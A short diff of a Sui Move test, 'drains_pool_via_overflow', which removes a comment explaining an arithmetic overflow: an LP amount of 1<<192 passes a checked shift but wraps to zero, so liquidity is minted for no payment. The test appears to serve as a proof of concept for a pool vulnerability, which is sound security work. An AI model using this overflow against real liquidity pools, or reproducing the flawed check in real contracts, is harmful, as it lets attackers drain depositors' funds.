@@ -15,8 +15,6 @@ fun drains_pool_via_overflow() {
     let seed = coin::mint_for_testing<SUI>(1_000_000, ts::ctx(&mut sc));
     let mut pool = pool::create(seed, ts::ctx(&mut sc));
 
-    // 1 << 192 passes checked_shlw (not > mask) but (1<<192)<<64 == 0 mod 2^256,
-    // so required_tokens == 0: mint dominant LP for zero payment
     let lp_amount: u256 = 1u256 << 192;
     let mut payment = coin::zero<SUI>(ts::ctx(&mut sc));
     let lp = pool::add_liquidity(&mut pool, lp_amount, &mut payment, ts::ctx(&mut sc));
